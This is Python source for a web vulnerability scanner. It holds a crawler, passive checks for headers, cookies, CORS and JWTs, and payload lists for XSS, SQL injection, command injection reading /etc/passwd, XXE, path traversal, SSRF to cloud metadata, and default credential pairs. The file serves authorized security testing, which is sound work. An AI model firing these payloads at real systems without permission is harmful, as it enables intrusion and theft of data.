#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║         WebVulnScan v9.0 — Production-Grade Security Scanner            ║
║         Enterprise Web & API Vulnerability Engine                       ║
╚══════════════════════════════════════════════════════════════════════════╝

  ⚠  LEGAL NOTICE: Use only on systems you own or have explicit written
     permission to test. Unauthorized scanning is illegal. The authors
     accept no liability for misuse.
"""

import argparse
import asyncio
import base64
import collections
import configparser
import json
import logging
import os
import re
import socket
import ssl
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from html.parser import HTMLParser
from typing import Dict, List, Optional, Set, Tuple

import requests
from requests.adapters import HTTPAdapter, Retry
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────────────────────────────────
logger = logging.getLogger("webvulnscan")
_handler = logging.StreamHandler()
_formatter = logging.Formatter("%(asctime)s %(levelname)s: %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
_handler.setFormatter(_formatter)
logger.addHandler(_handler)
logger.setLevel(logging.INFO)

# ──────────────────────────────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────────────────────────────
VERSION = "9.0"
DEFAULT_TIMEOUT = 12
DEFAULT_THREADS = 10
MAX_CRAWL_PAGES = 50

# ANSI Colors
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
C = "\033[96m"; M = "\033[95m"; W = "\033[97m"; BOLD = "\033[1m"
DIM = "\033[2m"; RST = "\033[0m"

# ──────────────────────────────────────────────────────────────────────────
# PAYLOADS
# ──────────────────────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
]
SQLI_PAYLOADS   = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "1 OR 1=1"]
SQLI_ERRORS     = ["syntax error", "mysql_fetch", "ora-0", "postgresql",
                   "sqlite3", "unclosed quotation", "sql syntax"]
SQLI_TIME_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' AND BENCHMARK(5000000,SHA1('x'))--",
    "' WAITFOR DELAY '00:00:05'--",
]
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
]
REDIRECT_PAYLOADS   = ["https://evil.com", "//evil.com"]
SSRF_PAYLOADS       = ["http://127.0.0.1", "http://metadata.google.internal", "http://169.254.169.254"]
CRYPTO_PARAMS       = ["private_key", "mnemonic", "seed", "api_key", "secret", "token", "wallet", "pk"]
SSTI_PAYLOADS       = ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>"]
XXE_PAYLOAD         = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
CMD_INJECTION_PAYLOADS = ["; id", "| cat /etc/passwd", "`whoami`", "$(whoami)"]
LDAP_INJECTION_PAYLOADS = ["*", "admin*", "*)(uid=*", "admin)(|(uid=*"]
BACKUP_EXTENSIONS   = [".bak", ".old", ".backup", ".swp", ".zip", ".tar", ".env", ".sql", ".config"]
COMMON_FILES        = ["", "/index.html", "/index.php", "/admin", "/config", "/web.config", "/.htaccess"]
DEFAULT_PATHS       = ["/admin", "/admin.php", "/login", "/wp-admin", "/administrator",
                       "/phpmyadmin", "/.git", "/.env", "/web.config", "/config.php"]
DEFAULT_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("root", "root"),
    ("admin", "123456"), ("test", "test"),
]
API_KEY_PATTERNS = [
    r'api[_-]?key[\s:=]+["\']?([a-zA-Z0-9\-]{20,})',
    r'(sk|pk)_[a-zA-Z0-9_]{32,}',
    r'token[\s:=]+["\']?([a-zA-Z0-9\-_.]{20,})',
]
KNOWN_CVE_VERSIONS = {
    "Apache/2.4.49": "CVE-2021-41773",
    "Apache/2.4.50": "CVE-2021-42013",
    "nginx/1.16":    "CVE-2019-9511",
    "OpenSSL/1.0.2": "CVE-2016-2183",
}
# Headers that must NOT be cache-keyed to test poisoning
CACHE_POISON_HEADERS = [
    {"X-Forwarded-Host": "attacker-canary.com"},
    {"X-Host": "attacker-canary.com"},
    {"X-Original-URL": "/attacker-canary"},
    {"X-Rewrite-URL": "/attacker-canary"},
    {"X-Forwarded-Prefix": "/attacker-canary"},
]
DOM_SINK_PATTERNS = [
    r'document\.write\s*\(',
    r'\.innerHTML\s*=',
    r'\.outerHTML\s*=',
    r'eval\s*\(',
    r'setTimeout\s*\(\s*["\']',
    r'setInterval\s*\(\s*["\']',
    r'location\.hash',
    r'location\.search',
    r'document\.URL',
    r'document\.referrer',
    r'window\.location\.href\s*=',
]
WS_COMMON_PATHS = ["/ws", "/websocket", "/socket", "/socket.io/", "/chat", "/api/ws", "/stream"]

# ──────────────────────────────────────────────────────────────────────────
# VULNERABILITY DATABASE
# ──────────────────────────────────────────────────────────────────────────
VULN_DB = {
    # Injection
    "sql_injection":        {"id":"CWE-89",   "sev":"CRITICAL","owasp":"A03","name":"SQL Injection",                     "fix":"Use parameterized queries."},
    "timing_sqli":          {"id":"CWE-89",   "sev":"HIGH",    "owasp":"A03","name":"Timing-Based SQL Injection",         "fix":"Use parameterized queries and a WAF."},
    "nosql_injection":      {"id":"CWE-943",  "sev":"HIGH",    "owasp":"A03","name":"NoSQL Injection",                   "fix":"Sanitize NoSQL queries."},
    "ldap_injection":       {"id":"CWE-90",   "sev":"HIGH",    "owasp":"A03","name":"LDAP Injection",                    "fix":"Sanitize LDAP query inputs."},
    "command_injection":    {"id":"CWE-78",   "sev":"CRITICAL","owasp":"A03","name":"Command Injection",                 "fix":"Avoid shell execution; use language APIs."},
    "ssti":                 {"id":"CWE-1336", "sev":"HIGH",    "owasp":"A03","name":"Server-Side Template Injection",     "fix":"Use sandboxed / safe templating engines."},
    "xxe":                  {"id":"CWE-611",  "sev":"CRITICAL","owasp":"A05","name":"XML External Entity (XXE)",          "fix":"Disable XML external entity processing."},
    "xss_reflected":        {"id":"CWE-79",   "sev":"HIGH",    "owasp":"A03","name":"Reflected XSS",                     "fix":"Encode all output; apply CSP."},
    "dom_xss":              {"id":"CWE-79",   "sev":"HIGH",    "owasp":"A03","name":"DOM-Based XSS",                     "fix":"Avoid dangerous sinks; sanitize DOM inputs."},
    "html_injection":       {"id":"CWE-94",   "sev":"MEDIUM",  "owasp":"A03","name":"HTML Injection",                    "fix":"Sanitize and encode HTML input."},
    "crlf_injection":       {"id":"CWE-93",   "sev":"MEDIUM",  "owasp":"A03","name":"CRLF Injection",                    "fix":"Strip \\r\\n from user-controlled input."},
    "prototype_pollution":  {"id":"CWE-1321", "sev":"HIGH",    "owasp":"A03","name":"Prototype Pollution",               "fix":"Validate object property keys; use Object.create(null)."},
    "xpath_injection":      {"id":"CWE-643",  "sev":"HIGH",    "owasp":"A03","name":"XPath Injection",                   "fix":"Parameterize XPath queries."},
    "path_normalization":   {"id":"CWE-22",   "sev":"MEDIUM",  "owasp":"A01","name":"Path Normalization Bypass",         "fix":"Normalize and validate paths before use."},
    # Access Control
    "directory_traversal":  {"id":"CWE-22",   "sev":"HIGH",    "owasp":"A01","name":"Path Traversal",                    "fix":"Validate and canonicalize file paths."},
    "open_redirect":        {"id":"CWE-601",  "sev":"MEDIUM",  "owasp":"A01","name":"Open Redirect",                    "fix":"Whitelist allowed redirect destinations."},
    "insecure_redirect":    {"id":"CWE-601",  "sev":"MEDIUM",  "owasp":"A01","name":"Insecure Redirect Pattern",         "fix":"Whitelist redirect URLs server-side."},
    "idor":                 {"id":"CWE-639",  "sev":"HIGH",    "owasp":"A01","name":"Insecure Direct Object Reference",  "fix":"Implement proper authorization checks."},
    "csrf_missing":         {"id":"CWE-352",  "sev":"HIGH",    "owasp":"A01","name":"CSRF Token Missing",                "fix":"Add CSRF tokens to all state-changing forms."},
    "directory_listing":    {"id":"CWE-548",  "sev":"MEDIUM",  "owasp":"A01","name":"Directory Listing Enabled",         "fix":"Disable directory listing in server config."},
    "mass_assignment":      {"id":"CWE-915",  "sev":"MEDIUM",  "owasp":"A04","name":"Mass Assignment",                   "fix":"Whitelist allowed input fields explicitly."},
    "bpla_graphql":         {"id":"CWE-213",  "sev":"HIGH",    "owasp":"A01","name":"Broken Property-Level Auth (GraphQL)","fix":"Apply field-level authorization in GraphQL resolvers."},
    "bpla_rest":            {"id":"CWE-213",  "sev":"HIGH",    "owasp":"A01","name":"Broken Property-Level Auth (REST)", "fix":"Filter sensitive fields from API responses."},
    # Crypto & Auth
    "weak_jwt":             {"id":"CWE-347",  "sev":"HIGH",    "owasp":"A02","name":"Weak JWT Signature",                "fix":"Use RS256; enforce algorithm; use strong secrets."},
    "jwt_algorithm_confusion":{"id":"CWE-347","sev":"HIGH",    "owasp":"A02","name":"JWT Algorithm Confusion",           "fix":"Whitelist accepted JWT algorithms."},
    "weak_ssl_tls":         {"id":"CWE-326",  "sev":"HIGH",    "owasp":"A02","name":"Weak SSL/TLS Configuration",        "fix":"Use TLS 1.2+; disable weak ciphers."},
    "crypto_key_exposure":  {"id":"CWE-798",  "sev":"CRITICAL","owasp":"A07","name":"Crypto Key/Secret in URL",          "fix":"Never pass sensitive keys in query strings."},
    "api_key_leakage":      {"id":"CWE-798",  "sev":"CRITICAL","owasp":"A07","name":"API Key in Response Body",          "fix":"Never expose API keys on the client side."},
    "default_credentials":  {"id":"CWE-521",  "sev":"CRITICAL","owasp":"A07","name":"Default Credentials Accepted",      "fix":"Change all default credentials immediately."},
    "weak_hash":            {"id":"CWE-327",  "sev":"HIGH",    "owasp":"A02","name":"Weak Hashing Algorithm",            "fix":"Use SHA-256 or bcrypt/argon2 for passwords."},
    "insecure_deserialization":{"id":"CWE-502","sev":"CRITICAL","owasp":"A08","name":"Unsafe Deserialization",           "fix":"Use safe serialization formats; validate input."},
    "brute_force_unprotected":{"id":"CWE-307","sev":"HIGH",    "owasp":"A07","name":"No Brute-Force Protection",         "fix":"Implement rate limiting and account lockout."},
    "session_fixation":     {"id":"CWE-384",  "sev":"MEDIUM",  "owasp":"A07","name":"Session Fixation",                  "fix":"Regenerate session ID after authentication."},
    # Security Misconfiguration
    "missing_hsts":         {"id":"CWE-319",  "sev":"MEDIUM",  "owasp":"A05","name":"Missing HSTS Header",               "fix":"Add Strict-Transport-Security header."},
    "missing_csp":          {"id":"CWE-1021", "sev":"MEDIUM",  "owasp":"A05","name":"Missing Content-Security-Policy",   "fix":"Add a restrictive Content-Security-Policy."},
    "missing_x_frame":      {"id":"CWE-1021", "sev":"MEDIUM",  "owasp":"A05","name":"Clickjacking – Missing X-Frame-Options","fix":"Add X-Frame-Options or frame-ancestors CSP."},
    "cors_misconfigured":   {"id":"CWE-942",  "sev":"HIGH",    "owasp":"A05","name":"CORS Wildcard (*)",                  "fix":"Restrict Access-Control-Allow-Origin to specific origins."},
    "cors_preflight":       {"id":"CWE-942",  "sev":"MEDIUM",  "owasp":"A05","name":"Insecure CORS Preflight",           "fix":"Restrict CORS properly; validate Origin."},
    "weak_cors":            {"id":"CWE-942",  "sev":"MEDIUM",  "owasp":"A05","name":"Weak CORS Configuration",           "fix":"Restrict CORS origins to trusted domains."},
    "insecure_cookie":      {"id":"CWE-614",  "sev":"MEDIUM",  "owasp":"A05","name":"Insecure Cookie Flags",             "fix":"Set HttpOnly, Secure, and SameSite on cookies."},
    "insecure_samesite":    {"id":"CWE-1275", "sev":"MEDIUM",  "owasp":"A05","name":"Missing SameSite Cookie Attribute", "fix":"Set SameSite=Strict or Lax on all cookies."},
    "debug_mode":           {"id":"CWE-489",  "sev":"MEDIUM",  "owasp":"A05","name":"Debug Mode Enabled",                "fix":"Disable debug/development mode in production."},
    "http_method_allowed":  {"id":"CWE-200",  "sev":"MEDIUM",  "owasp":"A05","name":"Dangerous HTTP Methods Enabled",    "fix":"Disable PUT/DELETE/TRACE/CONNECT."},
    "oauth_misconfiguration":{"id":"CWE-940", "sev":"HIGH",    "owasp":"A06","name":"OAuth Misconfiguration",            "fix":"Implement OAuth with proper validation."},
    "host_header_injection":{"id":"CWE-644",  "sev":"MEDIUM",  "owasp":"A05","name":"Host Header Injection",             "fix":"Validate and whitelist the Host header."},
    # Information Disclosure
    "info_disclosure":      {"id":"CWE-200",  "sev":"LOW",     "owasp":"A01","name":"Sensitive Header Disclosure",       "fix":"Remove Server, X-Powered-By, X-AspNet-Version."},
    "verbose_errors":       {"id":"CWE-209",  "sev":"LOW",     "owasp":"A01","name":"Verbose Error Messages",            "fix":"Display generic error pages in production."},
    "backup_file_exposure": {"id":"CWE-200",  "sev":"MEDIUM",  "owasp":"A01","name":"Backup File Exposed",               "fix":"Remove backup and temporary files from web root."},
    "backup_archives":      {"id":"CWE-200",  "sev":"MEDIUM",  "owasp":"A01","name":"Backup Archive Exposed",            "fix":"Remove .tar.gz, .zip, .sql files from web root."},
    "source_code_disclosure":{"id":"CWE-200", "sev":"MEDIUM",  "owasp":"A01","name":"Source Code / Config Exposed",      "fix":"Remove .git, .env, config files from public root."},
    "metadata_exposure":    {"id":"CWE-200",  "sev":"LOW",     "owasp":"A01","name":"File Metadata Exposed",             "fix":"Strip metadata from served files."},
    "graphql_introspection":{"id":"CWE-200",  "sev":"LOW",     "owasp":"A01","name":"GraphQL Introspection Enabled",     "fix":"Disable introspection in production."},
    "excessive_data_exposure":{"id":"CWE-200","sev":"HIGH",    "owasp":"A03","name":"Excessive Data Exposure in API",    "fix":"Filter API responses to return only needed fields."},
    "account_enumeration":  {"id":"CWE-203",  "sev":"LOW",     "owasp":"A01","name":"Account Enumeration",              "fix":"Return identical responses for valid/invalid users."},
    "outdated_server":      {"id":"CWE-937",  "sev":"HIGH",    "owasp":"A06","name":"Outdated/Vulnerable Server Software","fix":"Update server software to latest patched version."},
    "content_type_bypass":  {"id":"CWE-434",  "sev":"MEDIUM",  "owasp":"A04","name":"Content-Type Mismatch",            "fix":"Validate MIME types; set X-Content-Type-Options: nosniff."},
    # Infrastructure
    "ssrf":                 {"id":"CWE-918",  "sev":"HIGH",    "owasp":"A10","name":"SSRF (Response Indicator)",         "fix":"Whitelist outbound connections; use a DNS firewall."},
    "http_smuggling":       {"id":"CWE-444",  "sev":"HIGH",    "owasp":"A03","name":"HTTP/1.1 Request Smuggling (CL.TE)","fix":"Use consistent HTTP parsing; disable TE where unused."},
    "http2_rapid_reset":    {"id":"CWE-400",  "sev":"HIGH",    "owasp":"A04","name":"HTTP/2 Rapid Reset (CVE-2023-44487)","fix":"Patch server; limit concurrent streams; deploy WAF."},
    "http2_downgrade_smuggling":{"id":"CWE-444","sev":"HIGH",  "owasp":"A03","name":"HTTP/2→HTTP/1.1 Downgrade Smuggling","fix":"Ensure front-end/back-end use consistent HTTP versions."},
    "xml_bomb":             {"id":"CWE-776",  "sev":"MEDIUM",  "owasp":"A05","name":"XML Bomb / Billion Laughs",         "fix":"Limit XML entity expansion depth and count."},
    "rate_limiting":        {"id":"CWE-770",  "sev":"MEDIUM",  "owasp":"A04","name":"Missing Rate Limiting",            "fix":"Implement rate limiting and throttling."},
    "file_upload_issues":   {"id":"CWE-434",  "sev":"HIGH",    "owasp":"A04","name":"Dangerous File Upload Accepted",    "fix":"Validate file type, extension, and content server-side."},
    "subdomain_takeover":   {"id":"CWE-404",  "sev":"HIGH",    "owasp":"A06","name":"Potential Subdomain Takeover",      "fix":"Remove dangling CNAME records promptly."},
    # Web Cache
    "web_cache_poisoning":  {"id":"CWE-444",  "sev":"HIGH",    "owasp":"A03","name":"Web Cache Poisoning",              "fix":"Use keyed cache headers; strip unrecognized forwarded headers."},
    # WebSocket
    "websocket_no_auth":    {"id":"CWE-306",  "sev":"HIGH",    "owasp":"A07","name":"Unauthenticated WebSocket",         "fix":"Require auth tokens on WS handshake; validate Origin."},
    "websocket_data_leak":  {"id":"CWE-200",  "sev":"HIGH",    "owasp":"A01","name":"WebSocket Unauthenticated Data Leak","fix":"Authenticate before serving any data over WebSocket."},
}

CVSS = {
    "sql_injection":9.8, "timing_sqli":7.1, "nosql_injection":8.6, "ldap_injection":7.5,
    "command_injection":9.8, "ssti":8.0, "xxe":9.8, "xss_reflected":7.4, "dom_xss":7.4,
    "html_injection":6.1, "crlf_injection":6.5, "prototype_pollution":8.6, "xpath_injection":7.5,
    "path_normalization":6.5,
    "directory_traversal":7.5, "open_redirect":6.1, "insecure_redirect":6.5, "idor":7.1,
    "csrf_missing":8.1, "directory_listing":5.3, "mass_assignment":6.5,
    "bpla_graphql":7.5, "bpla_rest":7.5,
    "weak_jwt":7.5, "jwt_algorithm_confusion":8.1, "weak_ssl_tls":7.5,
    "crypto_key_exposure":9.1, "api_key_leakage":9.1, "default_credentials":9.8,
    "weak_hash":7.5, "insecure_deserialization":9.8, "brute_force_unprotected":7.1,
    "session_fixation":6.5,
    "missing_hsts":5.3, "missing_csp":5.3, "missing_x_frame":6.1,
    "cors_misconfigured":7.5, "cors_preflight":6.5, "weak_cors":6.5,
    "insecure_cookie":5.3, "insecure_samesite":5.3, "debug_mode":6.5,
    "http_method_allowed":6.5, "oauth_misconfiguration":7.5, "host_header_injection":6.5,
    "info_disclosure":5.3, "verbose_errors":5.3, "backup_file_exposure":5.3,
    "backup_archives":5.3, "source_code_disclosure":7.5, "metadata_exposure":5.3,
    "graphql_introspection":5.3, "excessive_data_exposure":7.5, "account_enumeration":5.3,
    "outdated_server":7.8, "content_type_bypass":6.5,
    "ssrf":8.6, "http_smuggling":8.1, "http2_rapid_reset":7.5,
    "http2_downgrade_smuggling":7.5, "xml_bomb":6.5, "rate_limiting":5.3,
    "file_upload_issues":8.1, "subdomain_takeover":7.5,
    "web_cache_poisoning":7.5,
    "websocket_no_auth":7.5, "websocket_data_leak":7.5,
}


def _vdb(key):
    return VULN_DB.get(key, {"id": "?", "sev": "INFO", "owasp": "?", "name": key, "fix": "?"})


# ──────────────────────────────────────────────────────────────────────────
# DATACLASSES
# ──────────────────────────────────────────────────────────────────────────
@dataclass
class Vulnerability:
    key: str
    cwe_id: str
    owasp: str
    name: str
    severity: str
    fix: str
    detail: str = ""
    url: str = ""
    cvss_score: float = 0.0
    poc: str = ""
    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )

    def to_dict(self):
        return asdict(self)


@dataclass
class ScanConfig:
    target: str
    targets_file: str = ""
    profile: str = "standard"
    scope: Set[str] = field(default_factory=set)
    timeout: int = DEFAULT_TIMEOUT
    threads: int = DEFAULT_THREADS
    max_crawl_pages: int = MAX_CRAWL_PAGES
    proxy: str = ""
    output_json: str = ""
    output_html: str = ""
    output_pocs: str = ""
    quiet: bool = False
    verbose: bool = False
    verify_ssl: bool = True
    skip_checks: Set[str] = field(default_factory=set)
    auth_cookie: str = ""       # e.g. "session=abc123"
    auth_header: str = ""       # e.g. "Authorization: Bearer token"
    authorized: bool = False    # Must be True to run active checks
    dom_xss: bool = False       # Enable Playwright-based DOM XSS (requires playwright)


# ──────────────────────────────────────────────────────────────────────────
# HTML PARSER / CRAWLER
# ──────────────────────────────────────────────────────────────────────────
class PageParser(HTMLParser):
    def __init__(self, base: str):
        super().__init__()
        self.base = base
        self.links: List[str] = []
        self.forms: List[Dict] = []
        self._current_form: Optional[Dict] = None

    def handle_starttag(self, tag, attrs):
        d = dict(attrs)
        if tag == "a" and d.get("href"):
            h = d["href"]
            if not h.startswith(("javascript:", "#", "mailto:", "tel:")):
                self.links.append(urllib.parse.urljoin(self.base, h))
        elif tag == "form":
            self._current_form = {**d, "inputs": []}
            self.forms.append(self._current_form)
        elif tag == "input" and d.get("name"):
            if self._current_form is not None:
                self._current_form["inputs"].append(d.get("name"))
        elif tag == "textarea" and d.get("name"):
            if self._current_form is not None:
                self._current_form["inputs"].append(d.get("name"))

    def handle_endtag(self, tag):
        if tag == "form":
            self._current_form = None


# ──────────────────────────────────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────────────────────────────────
def pr(msg: str, cfg: ScanConfig):
    """Print user-facing output. Respects --quiet."""
    if not cfg.quiet:
        print(msg)


def dbg(msg: str, cfg: ScanConfig):
    """Print verbose debug message."""
    if cfg.verbose:
        logger.debug(msg)


def section(title: str, cfg: ScanConfig):
    if not cfg.quiet:
        print(f"\n{B}{BOLD}{'─'*56}{RST}\n{B}{BOLD}{title}{RST}\n{B}{BOLD}{'─'*56}{RST}")


def print_vuln(key: str, cfg: ScanConfig, detail: str = "", url: str = "", poc: str = ""):
    v = _vdb(key)
    s = v["sev"]
    c = CVSS.get(key, 0.0)
    clr = R if s in ("CRITICAL", "HIGH") else Y if s == "MEDIUM" else C
    print(f"  {clr}[{s}]{RST} {v['name']} (CVSS: {c})")
    if detail:
        print(f"    Detail: {detail}")
    if url:
        print(f"    URL:    {url}")
    if poc:
        print(f"    {M}PoC:    {poc}{RST}")
    print(f"    Fix:    {G}{v['fix']}{RST}\n")


def vadd(
    findings: List[Vulnerability],
    key: str,
    detail: str = "",
    url: str = "",
    poc: str = "",
):
    """Add a finding, deduplicating by (key, url)."""
    if any(f.key == key and f.url == url for f in findings):
        return
    v = _vdb(key)
    findings.append(
        Vulnerability(
            key=key,
            cwe_id=v["id"],
            owasp=v["owasp"],
            name=v["name"],
            severity=v["sev"],
            fix=v["fix"],
            detail=detail,
            url=url,
            cvss_score=CVSS.get(key, 0.0),
            poc=poc,
        )
    )


def normalize(url: str) -> str:
    if not url.startswith("http"):
        return "https://" + url
    return url.rstrip("/")


def get_session(cfg: ScanConfig) -> requests.Session:
    s = requests.Session()
    headers = {"User-Agent": f"WebVulnScan/{VERSION}"}
    if cfg.auth_cookie:
        headers["Cookie"] = cfg.auth_cookie
    if cfg.auth_header:
        try:
            name, _, value = cfg.auth_header.partition(":")
            headers[name.strip()] = value.strip()
        except Exception:
            logger.warning(f"Could not parse --auth-header value: {cfg.auth_header!r}")
    s.headers.update(headers)
    if cfg.proxy:
        s.proxies = {"http": cfg.proxy, "https": cfg.proxy}
    s.verify = cfg.verify_ssl
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[429, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s


def req(session: requests.Session, url: str, cfg: ScanConfig,
        method: str = "GET", **kw) -> Optional[requests.Response]:
    """
    Perform an HTTP request and return the Response (any status code).
    Returns None only on a network/connection error.
    """
    try:
        kw.setdefault("timeout", cfg.timeout)
        return session.request(method, url, **kw)
    except requests.RequestException as e:
        dbg(f"Request error ({method} {url}): {e}", cfg)
        return None
    except Exception as e:
        logger.debug(f"Unexpected error during request to {url}: {e}")
        return None


def get_all_set_cookie_values(resp: requests.Response) -> List[str]:
    """Return all Set-Cookie header values (requests only exposes the last one via .headers)."""
    if hasattr(resp.raw, "headers"):
        # urllib3 HTTPHeaderDict supports getlist
        try:
            return resp.raw.headers.getlist("set-cookie")
        except AttributeError:
            pass
    # Fallback: collect from cookies jar
    values = [v for v in [resp.headers.get("set-cookie")] if v]
    return values


# ──────────────────────────────────────────────────────────────────────────
# PROGRESS BAR
# ──────────────────────────────────────────────────────────────────────────
class _FallbackBar:
    def __init__(self, total, desc="", disable=False):
        self.total = total
        self.n = 0
        self.desc = desc
        self.disable = disable

    def update(self, n=1):
        if self.disable:
            return
        self.n += n
        pct = int(100 * self.n / self.total) if self.total else 0
        print(f"\r  {self.desc}: [{pct}%]", end="", flush=True)

    def close(self):
        if not self.disable:
            print()

    def __enter__(self):
        return self

    def __exit__(self, *_):
        self.close()


def make_bar(total, desc, cfg):
    try:
        from tqdm import tqdm
        return tqdm(total=total, desc=f"  {desc}", disable=cfg.quiet, leave=False)
    except ImportError:
        return _FallbackBar(total, desc, cfg.quiet)


# ──────────────────────────────────────────────────────────────────────────
# CRAWLER
# ──────────────────────────────────────────────────────────────────────────
def crawl(session, base, cfg):
    pr(f"  {C}[*] Crawling...{RST}", cfg)
    visited: Set[str] = set()
    to_visit: collections.deque = collections.deque([base])
    found_params: Set[str] = set()
    found_forms: List[Dict] = []

    domain = urllib.parse.urlparse(base).netloc

    with make_bar(cfg.max_crawl_pages, "Crawling", cfg) as bar:
        while to_visit and len(visited) < cfg.max_crawl_pages:
            url = to_visit.popleft()
            if url in visited:
                continue
            visited.add(url)

            r = req(session, url, cfg)
            if not r or r.status_code >= 400:
                bar.update()
                continue
            if "text/html" not in r.headers.get("content-type", ""):
                bar.update()
                continue

            try:
                parser = PageParser(url)
                parser.feed(r.text)

                parsed_url = urllib.parse.urlparse(url)
                for k in urllib.parse.parse_qs(parsed_url.query):
                    found_params.add(k)

                for form in parser.forms:
                    form["action_url"] = urllib.parse.urljoin(url, form.get("action", ""))
                    found_forms.append(form)

                for link in parser.links:
                    if domain in urllib.parse.urlparse(link).netloc:
                        if link not in visited:
                            to_visit.append(link)
            except Exception as e:
                dbg(f"Parse error on {url}: {e}", cfg)

            bar.update()

    pr(f"  {G}✔ Crawled {len(visited)} pages, {len(found_params)} params, "
       f"{len(found_forms)} forms.{RST}", cfg)
    return list(found_params), found_forms


# ══════════════════════════════════════════════════════════════════════════
# PASSIVE CHECKS (operate on the initial response, no extra requests)
# ══════════════════════════════════════════════════════════════════════════

def check_headers(resp, findings, cfg):
    section("[1] Security Headers", cfg)
    h = {k.lower(): v for k, v in resp.headers.items()}

    checks = [
        ("strict-transport-security", "missing_hsts",
         f"curl -I '{resp.url}' | grep -i strict-transport"),
        ("content-security-policy",   "missing_csp",
         f"curl -I '{resp.url}' | grep -i content-security"),
        ("x-frame-options",           "missing_x_frame",
         f"curl -I '{resp.url}' | grep -i x-frame"),
    ]
    found_any = False
    for header_name, vuln_key, poc in checks:
        if header_name not in h:
            found_any = True
            print_vuln(vuln_key, cfg, url=resp.url, poc=poc)
            vadd(findings, vuln_key, url=resp.url, poc=poc)
        else:
            pr(f"  {G}✔ {header_name} present{RST}", cfg)
    if not found_any:
        pr(f"  {G}✔ All basic security headers present.{RST}", cfg)


def check_cors(resp, findings, cfg):
    section("[2] CORS Configuration", cfg)
    acao = resp.headers.get("access-control-allow-origin", "")
    if acao == "*":
        poc = f"curl -H 'Origin: https://attacker.com' '{resp.url}'"
        print_vuln("cors_misconfigured", cfg, detail="Allow-Origin: *", url=resp.url, poc=poc)
        vadd(findings, "cors_misconfigured", "Allow-Origin: *", resp.url, poc=poc)
    elif acao in ("null", "undefined"):
        print_vuln("weak_cors", cfg, detail=f"Allow-Origin: {acao}", url=resp.url)
        vadd(findings, "weak_cors", f"CORS: {acao}", resp.url)
    else:
        pr(f"  {G}✔ CORS: {acao or 'not set'}{RST}", cfg)


def check_cookies(resp, findings, cfg):
    section("[3] Cookie Security", cfg)
    all_cookies = get_all_set_cookie_values(resp)
    if not all_cookies:
        pr(f"  {G}✔ No Set-Cookie headers found.{RST}", cfg)
        return

    poc_base = f"curl -I '{resp.url}' | grep -i set-cookie"
    found_any = False
    for cookie_val in all_cookies:
        cv = cookie_val  # preserve original case for flag checks
        if "HttpOnly" not in cv:
            print_vuln("insecure_cookie", cfg, detail="Missing HttpOnly flag", url=resp.url, poc=poc_base)
            vadd(findings, "insecure_cookie", "Missing HttpOnly", resp.url, poc=poc_base)
            found_any = True
        if "Secure" not in cv:
            print_vuln("insecure_cookie", cfg, detail="Missing Secure flag", url=resp.url, poc=poc_base)
            vadd(findings, "insecure_cookie", "Missing Secure flag", resp.url, poc=poc_base)
            found_any = True
        if "SameSite" not in cv:
            print_vuln("insecure_samesite", cfg, detail="Missing SameSite attribute", url=resp.url, poc=poc_base)
            vadd(findings, "insecure_samesite", "Missing SameSite", resp.url, poc=poc_base)
            found_any = True
    if not found_any:
        pr(f"  {G}✔ Cookies have proper security flags.{RST}", cfg)


def check_info_disclosure(resp, findings, cfg):
    section("[4] Information Disclosure (Headers)", cfg)
    h = {k.lower(): v for k, v in resp.headers.items()}
    sensitive = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version", "x-runtime"]
    found: List[Tuple[str, str]] = []
    for hdr in sensitive:
        if hdr in h:
            found.append((hdr, h[hdr]))
    if found:
        for hdr, val in found:
            print_vuln("info_disclosure", cfg, detail=f"{hdr}: {val}", url=resp.url)
            vadd(findings, "info_disclosure", f"{hdr}: {val}", resp.url)
    else:
        pr(f"  {G}✔ No sensitive headers disclosed.{RST}", cfg)


def check_jwt_tokens(resp, findings, cfg):
    section("[5] JWT Analysis", cfg)
    # Collect candidate JWT strings from cookies and response body
    sources = [
        " ".join(get_all_set_cookie_values(resp)),
        " ".join(f"{k}={v}" for k, v in resp.cookies.items()),
        resp.text[:4096],
    ]
    combined = " ".join(sources)
    jwt_pattern = re.compile(r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*")
    found_jwts = jwt_pattern.findall(combined)

    if not found_jwts:
        pr(f"  {G}✔ No JWT tokens found.{RST}", cfg)
        return

    for jwt in found_jwts[:3]:
        try:
            parts = jwt.split(".")
            # Pad base64 if needed
            header_b64 = parts[0] + "=="
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            alg = header.get("alg", "").upper()
            if alg in ("NONE", ""):
                print_vuln("jwt_algorithm_confusion", cfg,
                           detail=f"JWT uses alg=none — signature not verified",
                           url=resp.url)
                vadd(findings, "jwt_algorithm_confusion", "alg=none", resp.url)
            elif alg == "HS256":
                print_vuln("weak_jwt", cfg,
                           detail="JWT uses HS256 — may be brute-forceable if secret is weak",
                           url=resp.url)
                vadd(findings, "weak_jwt", "HS256 algorithm", resp.url)
        except Exception as e:
            dbg(f"JWT decode error: {e}", cfg)


